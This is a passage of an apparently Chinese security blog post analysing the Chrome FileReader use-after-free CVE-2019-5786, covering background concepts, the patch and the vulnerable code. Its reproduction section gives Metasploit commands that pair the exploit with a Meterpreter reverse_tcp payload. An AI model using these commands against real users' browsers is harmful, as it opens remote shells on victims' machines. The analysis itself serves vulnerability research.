    <content type="html"><![CDATA[<h1 id="Blink-FileReader-UAF漏洞（CVE-2019-5786）"><a href="#Blink-FileReader-UAF漏洞（CVE-2019-5786）" class="headerlink" title="Blink FileReader UAF漏洞（CVE-2019-5786）"></a>Blink FileReader UAF漏洞（CVE-2019-5786）</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul><li>漏洞名称：Blink FileReader UAF漏洞（CVE-2019-5786）</li><li>漏洞编号：CVE-2019-5786</li><li>漏洞类型：UAF</li><li>漏洞影响：远程代码执行</li><li>CVSS3.0：N/A</li><li>CVSS2.0：N/A</li><li>漏洞危害等级：严重</li></ul><h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>Blink是Google基于WebKit fork出的自己的渲染引擎。</p><h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p><a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=936448" >https://bugs.chromium.org/p/chromium/issues/detail?id=936448<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/" >https://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/<i class="fas fa-external-link-alt"></i></a></p><h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p><a class="link"   href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html" >https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html<i class="fas fa-external-link-alt"></i></a></p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装72.0.3626.81的Chrome浏览器</p><h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><h4 id="（1）msf复现"><a href="#（1）msf复现" class="headerlink" title="（1）msf复现"></a>（1）msf复现</h4><p>1、打开msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/chrome_filereader_uaf</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> URIPATH /</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.126.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2021/05/31/CVE-2019-5786/image-20210514125243955.png" alt="image-20210514125243955"></p><p>2、搭建WIn7 x86环境，安装Chrome在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。访问恶意地址网页。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210514125902439.png" alt="image-20210514125902439"></p><p>3、msf出获得session</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210514125524165.png" alt="image-20210514125524165"></p><h4 id="（2）github公开exp复现"><a href="#（2）github公开exp复现" class="headerlink" title="（2）github公开exp复现"></a>（2）github公开exp复现</h4><p>搭建win 7 sp1 x86漏洞环境，访问漏洞exp页面，复现结果如下。（复现时个人机器访问iframe.html无法成功弹出计算器，直接访问exploit.html才可以成功的进行复现，仅做记录）</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210531153503754.png" alt="image-20210531153503754"></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul><li>漏洞文件：third_party/blink/renderer/core/fileapi/file_reader_loader.cc</li><li>漏洞函数：FileReaderLoader::ArrayBufferResult()</li><li>编译后漏洞文件：chrome_child.dll</li><li>编译后漏洞函数：blink::FileReaderLoader::ArrayBufferResult()</li></ul><h3 id="2、背景知识"><a href="#2、背景知识" class="headerlink" title="2、背景知识"></a>2、背景知识</h3><h4 id="（0）FileReader对象"><a href="#（0）FileReader对象" class="headerlink" title="（0）FileReader对象"></a>（0）FileReader对象</h4><p>前言：</p><p>HTML5的FileReader API可以让客户端浏览器对用户本地文件进行读取，这样就不再需要上传文件由服务器进行读取了，这大大减轻了服务器的负担，也节省了上传文件所需要的时间。</p><p>下面的内容参考[1]</p><blockquote><p>该**<code>FileReader</code>**对象可以异步读取用户计算机上存储的文件（或原始数据缓冲区）的内容,使用[File]或[Blob]对象指定要读取的文件或数据。Blob对象代表不可变的原始数据的类似文件的对象。它们可以读取为文本或二进制数据，也可以转换为Readable Stream。 Blob可以表示不一定是JavaScript本机格式的数据。 File接口基于Blob，继承了Blob功能并将其扩展为支持用户系统上的文件。File提供有关文件的信息，并允许网页中的JavaScript访问其内容。</p></blockquote><p>FileReader相关的状态[1]如下，EMPTY（还未加载）、LOADING（正在加载）、DONE（加载完成）</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210517115202067.png" alt="image-20210517115202067"></p><p>FileReader有一些内置事件，包括abort、error、load、loadend、loadstart、progress。可以为这些事件自定义处理函数，其中progress事件在读取数据时定期触发，我们可以注册progress事件的回调函数。如果在这时候去获取result，就会在未加载完成时进入FileReaderLoader::ArrayBufferResult函数。如果将要读取的数据的长度设置的稍微大一点，就会在加载的过程中多次回调这个函数。</p><blockquote><p><code>FileReader.onprogress</code><br> A handler for the <code>progress</code> event. This event is triggered while reading a <code>Blob</code> content.<br>        <code>FileReader.onloadstart</code><br> A handler for the <code>loadstart</code> event. This event is triggered each time the reading is starting.</p></blockquote><h4 id="（1）Chrome调试方式"><a href="#（1）Chrome调试方式" class="headerlink" title="（1）Chrome调试方式"></a>（1）Chrome调试方式</h4><p>（1）确定要调试的进程pid</p><p>因为chrome是多进程模式，所以在调试的时候会有多个chrome进程。可以通过打开Chrome本身的任务管理器（shift+esc）来查看相关信息</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524160855197.png" alt="image-20210524160855197"></p><p>通过打开的标签页可以看到我们具体要操作的是哪个pid，这里假如我们的目标是123这个标签页的话，需要调试的pid则为11708。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524161055630.png" alt="image-20210524161055630"></p><p>（2）attach process</p><p>之后就是常规的attach操作了，这里就不贴图了。</p><h4 id="（2）符号服务器以及符号文件配置"><a href="#（2）符号服务器以及符号文件配置" class="headerlink" title="（2）符号服务器以及符号文件配置"></a>（2）符号服务器以及符号文件配置</h4><p>（1）Chrome</p><p>Chrome可以配置系统的环境变量来指定相关的符号服务器[2]，具体操作方法为新增环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名：_NT_SYMBOL_PATH</span><br><span class="line">变量值：SRV*c:\symbols*https://msdl.microsoft.com/download/symbols;SRV*c:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com</span><br></pre></td></tr></table></figure><p>（2）Chromium</p><p>Chromium可以下载相关的pdb文件来进行调试，可以通过[3]下载旧版本的Chromium应用程序以及符号文件等，下图链接参考[4]</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524173059338.png" alt="image-20210524173059338"></p><h4 id="（3）代码查看工具sourcegraph"><a href="#（3）代码查看工具sourcegraph" class="headerlink" title="（3）代码查看工具sourcegraph"></a>（3）代码查看工具sourcegraph</h4><p>该工具可以查看变量的定义和引用等。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524173405047.png" alt="image-20210524173405047"></p><h4 id="（4）Web-Worker"><a href="#（4）Web-Worker" class="headerlink" title="（4）Web Worker"></a>（4）Web Worker</h4><p>在chrome中，Worker由v8实现，而非blink，验证如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(Worker)!==<span class="string">&quot;undefined&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(Worker));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 1.js </span></span><br><span class="line">1</span><br><span class="line"><span class="keyword">function</span></span><br></pre></td></tr></table></figure><p>其实这种方式是可以确定js函数是在v8引擎实现的还是在blink引擎实现的，比如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(FileReader)!==<span class="string">&quot;undefined&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(FileReader));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 1.js </span></span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>而在浏览器中就可以正常的输出，将console.log替换为document.write</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210525160118851.png" alt="image-20210525160118851"></p><p>扯远了，继续说Web Worker</p><p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p><p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务，被 Worker 线程负担了，主线程（通常负责 UI 交互）就会很流畅，不会被阻塞或拖慢。</p><p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p><p>Web Worker 有以下几个使用注意点。</p><p>（1）<strong>同源限制</strong></p><p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p><p>（2）<strong>DOM 限制</strong></p><p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以<code>navigator</code>对象和<code>location</code>对象。</p><p>（3）<strong>通信联系</strong></p><p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p><p>（4）<strong>脚本限制</strong></p><p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p><p>（5）<strong>文件限制</strong></p><p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。[6]</p><h4 id="（5）std-move"><a href="#（5）std-move" class="headerlink" title="（5）std::move"></a>（5）std::move</h4><p>函数原型定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> remove_reference&lt;T&gt;::<span class="function">type&amp;&amp; <span class="title">move</span><span class="params">(T&amp;&amp; t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">typename</span> remove_reference&lt;T&gt;::type&amp;&amp;&gt;(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过move定义可以看出，move并没有”移动“什么内容，<strong>只是将传入的值转换为右值</strong>，此外没有其他动作。std::move+移动构造函数或者移动赋值运算符，才能充分起到减少不必要拷贝的意义。</p><blockquote><p>std::move函数可以以非常简单的方式将左值引用转换为右值引用。（左值、左值引用、右值、右值引用 参见：[7]）</p><p>通过std::move，可以避免不必要的拷贝操作。</p><p>std::move是为性能而生。</p><p>std::move是将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存的搬迁或者内存拷贝。[8]</p><p>还有一份比较详细的解释，参考[9]</p></blockquote><p>对于我们来说，move的作用就是转变所有权的过程，该过程不涉及内存拷贝而只是将某进程或线程的所有权转交给另一个进程或线程。</p><p>调试的过程中发现：所谓std::move并不是简单的替换指针指向，其中也会涉及到内存拷贝的操作以及内存释放的操作，具体为什么节约性能暂时不清楚，下面是当我操作string对象的时候的代码以及内存现场，其中涉及了内存拷贝的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::string str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    std::string str1;</span><br><span class="line">    str1 = std::<span class="built_in">move</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用栈如下，通过调试的过程中，发现std::move的过程是先通过memcpy拷贝内存，之后将原来内存的第一个字符overwrite为0x00，这样原来的str读取后就为空。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1      vcruntime140d.dll!memcpy(unsigned char * dst, unsigned char * src, unsigned long count)</span><br><span class="line">2      test_c++.exe!std::string::_Memcpy_val_from(const std::string &amp; _Right)</span><br><span class="line">3      test_c++.exe!std::string::_Take_contents(std::string &amp; _Right, std::integral_constant&lt;bool,1&gt; __formal)</span><br><span class="line">4      test_c++.exe!std::string::_Move_assign(std::string &amp; _Right, std::_Equal_allocators __formal)</span><br><span class="line">5      test_c++.exe!std::string::operator=(std::string &amp;&amp; _Right)</span><br><span class="line">6      test_c++.exe!main()</span><br><span class="line">7      test_c++.exe!invoke_main()</span><br><span class="line">8      test_c++.exe!__scrt_common_main_seh()</span><br><span class="line">9      test_c++.exe!__scrt_common_main()</span><br><span class="line">10     test_c++.exe!mainCRTStartup(void * __formal)</span><br><span class="line">11     kernel32.dll!@BaseThreadInitThunk@12()</span><br><span class="line">12     ntdll.dll!__RtlUserThreadStart()</span><br><span class="line">13     ntdll.dll!__RtlUserThreadStart@8()</span><br></pre></td></tr></table></figure><p>所以不可以单纯的将std::move理解为不含任何空间拷贝或者分配释放，可能它的作用是减少空间拷贝的次数。</p><h4 id="（6）ArrayBuffer-Neutering"><a href="#（6）ArrayBuffer-Neutering" class="headerlink" title="（6）ArrayBuffer Neutering"></a>（6）ArrayBuffer Neutering</h4><p>参考[14]</p><p>如何释放一个 ArrayBuffer 的 <strong>backing store</strong> 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 <strong>Neuter</strong> 。在 V8 中，ArrayBuffer 提供了 <code>Neuter</code> 方法，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Detaches this ArrayBuffer and all its views (typed arrays).</span><br><span class="line"> * Detaching sets the byte length of the buffer and all typed arrays to zero,</span><br><span class="line"> * preventing JavaScript from ever accessing underlying backing store.</span><br><span class="line"> * ArrayBuffer should have been externalized and must be detachable.</span><br><span class="line"> */</span><br><span class="line">void Detach();</span><br><span class="line"></span><br><span class="line">// TODO(913887): fix the use of &#x27;neuter&#x27; in the API.</span><br><span class="line">V8_DEPRECATE_SOON(&quot;Use Detach() instead.&quot;, inline void Neuter()) &#123; Detach(); &#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Make this ArrayBuffer external. The pointer to underlying memory block</span><br><span class="line"> * and byte length are returned as |Contents| structure. After ArrayBuffer</span><br><span class="line"> * had been externalized, it does no longer own the memory block. The caller</span><br><span class="line"> * should take steps to free memory when it is no longer needed.</span><br><span class="line"> *</span><br><span class="line"> * The Data pointer of ArrayBuffer::Contents must be freed using the provided</span><br><span class="line"> * deleter, which will call ArrayBuffer::Allocator::Free if the buffer</span><br><span class="line"> * was allocated with ArraryBuffer::Allocator::Allocate.</span><br><span class="line"> */</span><br><span class="line">Contents Externalize();</span><br></pre></td></tr></table></figure><p>可以看到，调用 <code>Neuter</code> 时 ArrayBuffer 已经被 <strong>Externalized</strong> 了，此时 ArrayBuffer 的 <strong>backing store</strong> 已经被调用方所释放了。</p><p><strong>Neuter</strong> 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" >Web Workers<i class="fas fa-external-link-alt"></i></a> ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。</p><p>在 JavaScript 中，各线程之间通过 <code>postMessage</code> 实现数据的发送、通过 <code>onmessage</code> 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" >Structured clone algorithm<i class="fas fa-external-link-alt"></i></a> 来实现这一特性。</p><p>如果要传递的对象实现了 <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/Transferable" >Transferable<i class="fas fa-external-link-alt"></i></a> 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 <strong>疑问</strong> ：实际情况中，原有 ArrayBuffer 的 <strong>backing store</strong> 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。</p><p>线程相关的两个重要概念定义如下：</p><ul><li><p><code>postMessage</code> 发送消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>message 表示要传递的数据</li><li>如果有实现了 <code>Transferable</code> 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收</li></ul></li><li><p><code>onmessage</code> 响应消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myWorker.onmessage = function(e) &#123; ... &#125;</span><br></pre></td></tr></table></figure><ul><li>通过事件的 <code>data</code> 属性访问接收到的数据</li></ul></li></ul><p>一个简单的例子如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- main.html 的代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var worker = new Worker(&#x27;worker.js&#x27;);</span><br><span class="line">console.log(&#x27;Main thread: before postMessage, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">worker.postMessage(ab, [ab]);</span><br><span class="line">console.log(&#x27;Main thread: after postMessage, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// worker.js 的代码</span><br><span class="line">onmessage = function(message) &#123;</span><br><span class="line">    var ab = message.data;</span><br><span class="line">    console.log(&#x27;Worker thread: received: &#x27; + ab);</span><br><span class="line">    console.log(&#x27;Wroker thread: ArrayBuffer.byteLength is : &#x27; + ab.byteLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Main thread: before postMessage, ab.byteLength is 4096</span><br><span class="line">Main thread: after postMessage, ab.byteLength is 0</span><br><span class="line">Worker thread: received: [object ArrayBuffer]</span><br><span class="line">Wroker thread: ArrayBuffer.byteLength is : 4096</span><br></pre></td></tr></table></figure><p>McAfee Labs 的文章提到，使用 <a class="link"   href="https://developer.mozilla.org/en-US/docs/Web/API/BaseAudioContext/decodeAudioData" >AudioContext.decodeAudioData<i class="fas fa-external-link-alt"></i></a> 同样可以实现 ArrayBuffer 的 <a class="link"   href="https://programlife.net/tags/Neuter/" >Neuter<i class="fas fa-external-link-alt"></i></a> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var context = new AudioContext();</span><br><span class="line">console.log(&#x27;Before decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">context.decodeAudioData(ab, </span><br><span class="line">    function(buffer) &#123;</span><br><span class="line">        console.log(&#x27;decode succeed: &#x27; + buffer);</span><br><span class="line">    &#125;, </span><br><span class="line">    function(e) &#123;</span><br><span class="line">        console.log(&#x27;decode failed: &#x27; + e);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">console.log(&#x27;After decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before decodeAudioData, ab.byteLength is 4096</span><br><span class="line">After decodeAudioData, ab.byteLength is 0</span><br><span class="line">decode failed: EncodingError: Unable to decode audio data</span><br></pre></td></tr></table></figure><h3 id="3、补丁比较"><a href="#3、补丁比较" class="headerlink" title="3、补丁比较"></a>3、补丁比较</h3><p>观察补丁代码，可以发现在if (!finished_loading_)的逻辑上做了修改</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210514163855121.png" alt="image-20210514163855121"></p><p>补丁前处理逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure><p>补丁后处理逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DOMArrayBuffer::Create(<span class="built_in">ArrayBuffer</span>::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure><p>可以看出一个使用了raw_data_-&gt;ToArrayBuffer()作为参数，另一个使用了ArrayBuffer::Create()的返回值作为参数。</p><p>而commit的信息也提示了我们修复后的代码可能新开辟了一块内存</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Merge M72: FileReader: Make a copy of the ArrayBuffer when returning partial results.</span><br><span class="line"></span><br><span class="line">This is to avoid accidentally ending up with multiple references to the</span><br><span class="line">same underlying ArrayBuffer.</span><br></pre></td></tr></table></figure></blockquote><p>猜测补丁后的Create将原有buffer内容复制到了一个新的buffer上，目的是为了避免多个指针指向同一块内存引发误操作。</p><h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><h4 id="（1）静态分析"><a href="#（1）静态分析" class="headerlink" title="（1）静态分析"></a>（1）静态分析</h4><p>通过代码分析下函数功能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DOMArrayBuffer* <span class="title">FileReaderLoader::ArrayBufferResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    <span class="built_in">AdjustReportedMemoryUsageToV8</span>(</span><br><span class="line">        <span class="number">-1</span> * <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">    raw_data_.<span class="built_in">reset</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FileReaderLoader::ArrayBufferResult函数首先判断文件是否已经全部读取完成，如果已全部读取完成，则返回该缓冲区，如果尚未加载或产生错误，则返回空，如果数据正在被加载，则返回DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer())的返回值。</p><p>修复后的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 